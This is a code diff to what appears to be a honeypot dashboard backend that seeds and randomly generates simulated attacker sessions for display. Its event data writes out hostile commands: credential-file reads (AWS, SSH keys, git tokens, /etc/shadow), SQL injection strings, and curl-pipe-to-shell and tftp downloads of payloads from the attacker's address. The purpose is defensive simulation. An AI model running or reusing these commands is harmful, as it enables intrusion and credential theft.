@@ -451,6 +451,81 @@ async def seed_example_data(db: Session = Depends(database.get_db)):
                     ("command_execution", "enable", "Password:", "Telnet"),
                     ("command_execution", "sh running-config", "Building configuration... Current configuration : 1084 bytes", "Telnet"),
                 ]
+            },
+            {
+                "id": "sess-live-ssh-usa-06",
+                "ip_address": "198.51.100.42",
+                "protocol": "SSH",
+                "country": "USA",
+                "city": "Washington",
+                "latitude": 38.9072,
+                "longitude": -77.0369,
+                "username_attempted": "ubuntu",
+                "password_attempted": "password123",
+                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=18),
+                "ended_at": None,
+                "events": [
+                    ("login_attempt", "ubuntu / password123", "Accepted password for ubuntu from 198.51.100.42 port 54112 ssh2", "SSH"),
+                    ("command_execution", "id", "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo)", "SSH"),
+                    ("command_execution", "sudo -l", "(ALL : ALL) NOPASSWD: ALL", "SSH"),
+                    ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE", "SSH"),
+                    ("command_execution", "docker ps", "CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS\n4a12f9b8c01e   prod-db:latest   docker-entrypoint.sh     2 days ago      Up 2 days", "SSH"),
+                ]
+            },
+            {
+                "id": "sess-live-http-canada-07",
+                "ip_address": "192.0.2.78",
+                "protocol": "HTTP",
+                "country": "Canada",
+                "city": "Ottawa",
+                "latitude": 45.4215,
+                "longitude": -75.6972,
+                "username_attempted": "manager",
+                "password_attempted": "admin@2024",
+                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=12),
+                "ended_at": None,
+                "events": [
+                    ("login_attempt", "manager / admin@2024", "HTTP 200 OK - Redirecting to /internal/dashboard", "HTTP"),
+                    ("command_execution", "GET /api/v1/users?role=admin", "HTTP 200 OK - Extracted 12 honeytoken records", "HTTP"),
+                    ("command_execution", "POST /api/v1/upload payload.php.jpg", "File quarantined by Sandbox engine", "HTTP"),
+                ]
+            },
+            {
+                "id": "sess-live-ssh-dubai-08",
+                "ip_address": "94.200.15.112",
+                "protocol": "SSH",
+                "country": "Dubai",
+                "city": "Dubai",
+                "latitude": 25.2048,
+                "longitude": 55.2708,
+                "username_attempted": "operator",
+                "password_attempted": "dubai#vip99",
+                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=8),
+                "ended_at": None,
+                "events": [
+                    ("login_attempt", "operator / dubai#vip99", "Accepted password for operator from 94.200.15.112 port 48991 ssh2", "SSH"),
+                    ("command_execution", "hostname", "gateway-dmz-01", "SSH"),
+                    ("command_execution", "netstat -tulpn", "Active Internet connections (only servers)\ntcp  0  0  0.0.0.0:22  0.0.0.0:*  LISTEN", "SSH"),
+                    ("canary_tripwire_triggered", "cat /root/.git-credentials", "Tripwire Beacon Dispatched: canary_tripwire_github_token\nhttps://sentineltrap-deploy-bot:ghp_9kL2x0Vb8M1qR3oP4zW6Y7tJ5nE0A8cCdEfG@github.com", "SSH"),
+                ]
+            },
+            {
+                "id": "sess-live-mysql-china-09",
+                "ip_address": "114.114.114.88",
+                "protocol": "MySQL",
+                "country": "China",
+                "city": "Beijing",
+                "latitude": 39.9042,
+                "longitude": 116.4074,
+                "username_attempted": "root",
+                "password_attempted": "123456",
+                "started_at": datetime.datetime.utcnow() - datetime.timedelta(minutes=5),
+                "ended_at": None,
+                "events": [
+                    ("login_attempt", "root / 123456", "Handshake 5.7.34-MySQL accepted from 114.114.114.88:3306", "MySQL"),
+                    ("command_execution", "SELECT user, host FROM mysql.user;", "Trap Activated: User account table exfiltration attempt", "MySQL"),
+                    ("command_execution", "SELECT * FROM payments_db.credit_cards LIMIT 10;", "Trap Activated: Canary Honeytoken Triggered [DB_EXFIL_ATTEMPT: canary_customer_vault]", "MySQL"),
+                ]
             }
         ]
 
@@ -514,97 +589,115 @@ async def simulate_live_ingress_attack(persona: str = None, db: Session = Depend
 
     active_persona = persona or decoys.current_persona_id or "all_mesh"
 
-    # Define persona-specific attack profiles
-    persona_profiles = {
-        "web_app": {
-            "protocol": "HTTP",
-            "adversary": {"ip": "194.26.29.114", "country": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041, "user": "admin", "pass": "' OR '1'='1"},
-            "stages": [
-                ("login_attempt", "admin'--", "HTTP 200 OK - Redirecting to /admin/dashboard", "HTTP"),
-                ("command_execution", "GET /api/v1/debug?cmd=cat%20/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", "HTTP"),
-                ("canary_tripwire_triggered", "cat /var/www/html/config.php", "Tripwire Beacon Dispatched: canary_tripwire_web_config\n<?php define('DB_USER', 'db_vault_admin'); define('DB_PASSWORD', 'V4ult#Pr0d!9982'); ?>", "HTTP"),
-                ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE", "HTTP"),
-                ("deception_triggered", "cat /var/www/html/.env", "Trap activated: credential_harvesting\nAPP_KEY=base64:TrapMasterSecretKey==\nDB_PASS=V4ult#Pr0d!9982", "HTTP"),
-            ],
-            "decoy_name": "Web Application Trap"
-        },
-        "database_cluster": {
-            "protocol": "MySQL",
-            "adversary": {"ip": "45.155.205.233", "country": "Russia", "city": "Moscow", "lat": 55.7558, "lon": 37.6173, "user": "root", "pass": "toor2024"},
-            "stages": [
-                ("login_attempt", "root / toor2024", "Handshake 5.7.34-MySQL-Standard accepted from 45.155.205.233:3306", "MySQL"),
-                ("command_execution", "SHOW DATABASES;", "information_schema\ncustomer_vault\npayments_db", "MySQL"),
-                ("canary_tripwire_triggered", "SELECT * FROM payments_db.credit_cards LIMIT 5;", "Trap Activated: Canary Honeytoken Triggered [DB_EXFIL_ATTEMPT: canary_customer_vault]", "MySQL"),
-                ("command_execution", "CONFIG SET dir /var/spool/cron/crontabs", "OK", "Redis"),
-                ("command_execution", "SET backup '* * * * * curl http://45.155.205.233/shell.sh | sh'", "Trap Activated: Unauthorized Cron Injection", "Redis"),
-                ("deception_triggered", "SAVE", "DB saved on disk [Sandboxed Decoy Database]", "Redis"),
-            ],
-            "decoy_name": "MySQL Decoy"
-        },
-        "mail_gateway": {
-            "protocol": "SMTP",
-            "adversary": {"ip": "91.240.118.242", "country": "Bulgaria", "city": "Sofia", "lat": 42.6977, "lon": 23.3219, "user": "postfix", "pass": "relay_test"},
-            "stages": [
-                ("login_attempt", "HELO mail.attacker-domain.com", "250 smtp.sentineltrap.internal Hello mail.attacker-domain.com", "SMTP"),
-                ("command_execution", "MAIL FROM:<spoofed@internal.corp>", "250 2.1.0 Ok - sender accepted", "SMTP"),
-                ("command_execution", "RCPT TO:<ceo@target-bank.com>", "250 2.1.5 Ok - Open Relay Decoy Trapped", "SMTP"),
-                ("command_execution", "dig @127.0.0.1 -p 5353 AXFR corp.internal", "Decoy DNS Zone Transfer Intercepted: 4 records logged", "DNS"),
-                ("canary_tripwire_triggered", "cat /root/.ssh/id_rsa", "Tripwire Beacon Dispatched: canary_tripwire_ssh_private_key\n-----BEGIN OPENSSH PRIVATE KEY-----", "SSH"),
-                ("deception_triggered", "cat /etc/postfix/master.cf", "Trap activated: mail_configuration_reconnaissance", "SMTP"),
-            ],
-            "decoy_name": "SMTP Honeypot"
-        },
-        "iot_router": {
-            "protocol": "Telnet",
-            "adversary": {"ip": "103.149.138.82", "country": "Singapore", "city": "Singapore", "lat": 1.3521, "lon": 103.8198, "user": "admin", "pass": "admin1234"},
-            "stages": [
-                ("login_attempt", "admin / admin1234", "BusyBox v1.33.1 (Telnet Trap Gateway ready)", "Telnet"),
-                ("command_execution", "enable", "Password: [Mirai Botnet signature detected]", "Telnet"),
-                ("command_execution", "cat /proc/cpuinfo", "system type : MIPS 24KEc V5.0\nprocessor : 0\nBogoMIPS : 380.00", "Telnet"),
-                ("command_execution", "sh running-config", "Building configuration... Decoy IoT edge router active", "Telnet"),
-                ("canary_tripwire_triggered", "cat /home/admin/passwords.txt", "Tripwire Beacon Dispatched: canary_tripwire_passwords_file\nadmin : Tr@pM@ster2024! [Router Master]", "Telnet"),
-                ("deception_triggered", "tftp -g -r mips_bot http://103.149.138.82/bot.bin", "Trap activated: malware_stager_download_blocked", "Telnet"),
-            ],
-            "decoy_name": "Telnet Trap"
-        },
-        "all_mesh": {
-            "protocol": "SSH",
-            "adversary": {"ip": "185.220.101.5", "country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "user": "root", "pass": "admin9988"},
-            "stages": [
-                ("login_attempt", "root / admin9988", "Accepted password for root from attacker IP port 49210 ssh2", "SSH"),
-                ("command_execution", "whoami", "root", "SSH"),
-                ("command_execution", "uname -a", "Linux prod-web-srv-01 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64", "SSH"),
-                ("command_execution", "ls -la /root", "drwx------ 6 root root 4096 .aws\ndrwx------ 2 root root 4096 .ssh\n-rw------- 1 root root 180 .git-credentials\n-rw------- 1 root root 640 service-account.json\n-rw------- 1 root root 380 passwords.txt", "SSH"),
-                ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "SSH"),
-                ("canary_tripwire_triggered", "cat /root/.ssh/id_rsa", "Tripwire Beacon Dispatched: canary_tripwire_ssh_private_key\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjE... [HONEYTOKEN TRAPPED] ...\n-----END OPENSSH PRIVATE KEY-----", "SSH"),
-                ("canary_tripwire_triggered", "cat /root/.git-credentials", "Tripwire Beacon Dispatched: canary_tripwire_github_token\nhttps://sentineltrap-deploy-bot:ghp_9kL2x0Vb8M1qR3oP4zW6Y7tJ5nE0A8cCdEfG@github.com", "SSH"),
-                ("canary_tripwire_triggered", "cat /root/service-account.json", 'Tripwire Beacon Dispatched: canary_tripwire_gcp_service_account\n{\n  "client_email": "canary-prod-agent@sentineltrap-cloud-defense.iam.gserviceaccount.com"\n}', "SSH"),
-                ("canary_tripwire_triggered", "cat /home/admin/passwords.txt", "Tripwire Beacon Dispatched: canary_tripwire_passwords_file\nadmin : Tr@pM@ster2024! [SSH/Web]", "SSH"),
-                ("deception_triggered", "cat /etc/shadow", "Trap activated: credential_harvesting\nroot:$6$Z8sK1xQ...:18900:0:99999:7:::", "SSH"),
-            ],
-            "decoy_name": "SSH Honeypot"
-        }
-    }
+    # Dynamic Random Hacker Profile Generator
+    GLOBAL_HACKER_POOLS = [
+        {"country": "USA", "city": "Washington", "lat": 38.9072, "lon": -77.0369, "ip_prefix": "198.51.100"},
+        {"country": "USA", "city": "New York", "lat": 40.7128, "lon": -74.0060, "ip_prefix": "198.18.0"},
+        {"country": "USA", "city": "San Francisco", "lat": 37.7749, "lon": -122.4194, "ip_prefix": "192.88.99"},
+        {"country": "Canada", "city": "Ottawa", "lat": 45.4215, "lon": -75.6972, "ip_prefix": "192.0.2"},
+        {"country": "Canada", "city": "Toronto", "lat": 43.6532, "lon": -79.3832, "ip_prefix": "142.250.190"},
+        {"country": "Dubai", "city": "Dubai", "lat": 25.2048, "lon": 55.2708, "ip_prefix": "94.200.15"},
+        {"country": "China", "city": "Beijing", "lat": 39.9042, "lon": 116.4074, "ip_prefix": "114.114.114"},
+        {"country": "China", "city": "Shanghai", "lat": 31.2304, "lon": 121.4737, "ip_prefix": "202.96.209"},
+        {"country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "ip_prefix": "185.220.101"},
+        {"country": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041, "ip_prefix": "194.26.29"},
+        {"country": "Russia", "city": "Moscow", "lat": 55.7558, "lon": 37.6173, "ip_prefix": "45.155.205"},
+        {"country": "Singapore", "city": "Singapore", "lat": 1.3521, "lon": 103.8198, "ip_prefix": "103.149.138"},
+        {"country": "Bulgaria", "city": "Sofia", "lat": 42.6977, "lon": 23.3219, "ip_prefix": "91.240.118"},
+        {"country": "Brazil", "city": "Sao Paulo", "lat": -23.5505, "lon": -46.6333, "ip_prefix": "177.12.144"},
+        {"country": "Japan", "city": "Tokyo", "lat": 35.6762, "lon": 139.6503, "ip_prefix": "133.242.18"},
+        {"country": "United Kingdom", "city": "London", "lat": 51.5074, "lon": -0.1278, "ip_prefix": "185.143.221"},
+    ]
 
-    profile = persona_profiles.get(active_persona, persona_profiles["all_mesh"])
-    target = profile["adversary"]
-    attack_stages = profile["stages"]
-    protocol_used = profile["protocol"]
-    decoy_name = profile["decoy_name"]
+    USERNAMES_POOL = [
+        "root", "admin", "ubuntu", "operator", "support", "deploy", "guest", "oracle",
+        "postgres", "service", "system", "git", "test", "master", "devops", "backup"
+    ]
+
+    PASSWORDS_POOL = [
+        "admin1234", "password123", "toor", "123456", "root@2024", "P@ssw0rd2024",
+        "admin#vip99", "qwerty", "letmein", "toor2024", "' OR '1'='1", "supersecret"
+    ]
+
+    # Pick a random origin from global hacker hubs
+    origin = random.choice(GLOBAL_HACKER_POOLS)
+    rand_octet = random.randint(2, 254)
+    attacker_ip = f"{origin['ip_prefix']}.{rand_octet}"
+    attacker_user = random.choice(USERNAMES_POOL)
+    attacker_pass = random.choice(PASSWORDS_POOL)
+
+    # Determine protocol & attack stages based on active persona (or random if all_mesh)
+    if active_persona == "web_app":
+        protocol_used = "HTTP"
+        decoy_name = "Web Application Trap"
+        attack_stages = [
+            ("login_attempt", f"{attacker_user}'--", "HTTP 200 OK - Redirecting to /admin/dashboard", "HTTP"),
+            ("command_execution", "GET /api/v1/debug?cmd=cat%20/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", "HTTP"),
+            ("canary_tripwire_triggered", "cat /var/www/html/config.php", "Tripwire Beacon Dispatched: canary_tripwire_web_config\n<?php define('DB_USER', 'db_vault_admin'); define('DB_PASSWORD', 'V4ult#Pr0d!9982'); ?>", "HTTP"),
+            ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE", "HTTP"),
+            ("deception_triggered", "cat /var/www/html/.env", "Trap activated: credential_harvesting\nAPP_KEY=base64:TrapMasterSecretKey==\nDB_PASS=V4ult#Pr0d!9982", "HTTP"),
+        ]
+    elif active_persona == "database_cluster":
+        protocol_used = random.choice(["MySQL", "Redis"])
+        decoy_name = "MySQL Decoy" if protocol_used == "MySQL" else "Redis Decoy"
+        attack_stages = [
+            ("login_attempt", f"{attacker_user} / {attacker_pass}", f"Handshake accepted from {attacker_ip}", protocol_used),
+            ("command_execution", "SHOW DATABASES;", "information_schema\ncustomer_vault\npayments_db", "MySQL"),
+            ("canary_tripwire_triggered", "SELECT * FROM payments_db.credit_cards LIMIT 5;", "Trap Activated: Canary Honeytoken Triggered [DB_EXFIL_ATTEMPT: canary_customer_vault]", "MySQL"),
+            ("command_execution", "CONFIG SET dir /var/spool/cron/crontabs", "OK", "Redis"),
+            ("command_execution", f"SET backup '* * * * * curl http://{attacker_ip}/shell.sh | sh'", "Trap Activated: Unauthorized Cron Injection", "Redis"),
+            ("deception_triggered", "SAVE", "DB saved on disk [Sandboxed Decoy Database]", "Redis"),
+        ]
+    elif active_persona == "mail_gateway":
+        protocol_used = "SMTP"
+        decoy_name = "SMTP Honeypot"
+        attack_stages = [
+            ("login_attempt", f"HELO mail.{origin['country'].lower()}-proxy.org", "250 smtp.sentineltrap.internal Hello", "SMTP"),
+            ("command_execution", "MAIL FROM:<spoofed@internal.corp>", "250 2.1.0 Ok - sender accepted", "SMTP"),
+            ("command_execution", "RCPT TO:<ceo@target-bank.com>", "250 2.1.5 Ok - Open Relay Decoy Trapped", "SMTP"),
+            ("command_execution", "dig @127.0.0.1 -p 5353 AXFR corp.internal", "Decoy DNS Zone Transfer Intercepted: 4 records logged", "DNS"),
+            ("canary_tripwire_triggered", "cat /root/.ssh/id_rsa", "Tripwire Beacon Dispatched: canary_tripwire_ssh_private_key\n-----BEGIN OPENSSH PRIVATE KEY-----", "SSH"),
+            ("deception_triggered", "cat /etc/postfix/master.cf", "Trap activated: mail_configuration_reconnaissance", "SMTP"),
+        ]
+    elif active_persona == "iot_router":
+        protocol_used = "Telnet"
+        decoy_name = "Telnet Trap"
+        attack_stages = [
+            ("login_attempt", f"{attacker_user} / {attacker_pass}", "BusyBox v1.33.1 (Telnet Trap Gateway ready)", "Telnet"),
+            ("command_execution", "enable", "Password: [Mirai Botnet signature detected]", "Telnet"),
+            ("command_execution", "cat /proc/cpuinfo", "system type : MIPS 24KEc V5.0\nprocessor : 0\nBogoMIPS : 380.00", "Telnet"),
+            ("command_execution", "sh running-config", "Building configuration... Decoy IoT edge router active", "Telnet"),
+            ("canary_tripwire_triggered", "cat /home/admin/passwords.txt", "Tripwire Beacon Dispatched: canary_tripwire_passwords_file\nadmin : Tr@pM@ster2024! [Router Master]", "Telnet"),
+            ("deception_triggered", f"tftp -g -r mips_bot http://{attacker_ip}/bot.bin", "Trap activated: malware_stager_download_blocked", "Telnet"),
+        ]
+    else:
+        # all_mesh: Random protocol from mesh (SSH, HTTP, MySQL, Redis, Telnet)
+        protocol_used = random.choice(["SSH", "SSH", "HTTP", "MySQL", "Redis", "Telnet"])
+        decoy_name = f"{protocol_used} Honeypot"
+        attack_stages = [
+            ("login_attempt", f"{attacker_user} / {attacker_pass}", f"Accepted credentials for {attacker_user} from {attacker_ip} port {random.randint(40000, 60000)}", protocol_used),
+            ("command_execution", "whoami", attacker_user, protocol_used),
+            ("command_execution", "uname -a", "Linux prod-srv-01 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64", protocol_used),
+            ("canary_tripwire_triggered", "cat /root/.aws/credentials", "Tripwire Beacon Dispatched: canary_tripwire_aws_credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", protocol_used),
+            ("command_execution", "cat /etc/shadow", f"root:$6$Z8sK1xQ...:18900:0:99999:7:::\n{attacker_user}:*:18885:0:99999:7:::", protocol_used),
+            ("canary_tripwire_triggered", "cat /root/.git-credentials", "Tripwire Beacon Dispatched: canary_tripwire_github_token\nhttps://sentineltrap-deploy-bot:ghp_9kL2x0Vb8M1qR3oP4zW6Y7tJ5nE0A8cCdEfG@github.com", protocol_used),
+            ("command_execution", f"curl -s http://{attacker_ip}/stage2.sh | bash", f"Resolving host {attacker_ip}... Staged in /tmp/.sys_update", protocol_used),
+            ("deception_triggered", "crontab -l", f"no crontab for {attacker_user}", protocol_used),
+        ]
 
     session_id = f"sim-{uuid.uuid4().hex[:8]}"
 
     # 1. Create attacker session in DB
     session = models.SessionModel(
         id=session_id,
-        ip_address=target["ip"],
+        ip_address=attacker_ip,
         protocol=protocol_used,
-        country=target["country"],
-        city=target["city"],
-        latitude=target["lat"],
-        longitude=target["lon"],
-        username_attempted=target["user"],
-        password_attempted=target["pass"],
+        country=origin["country"],
+        city=origin["city"],
+        latitude=origin["lat"],
+        longitude=origin["lon"],
+        username_attempted=attacker_user,
+        password_attempted=attacker_pass,
         started_at=datetime.datetime.utcnow(),
         ended_at=None
     )
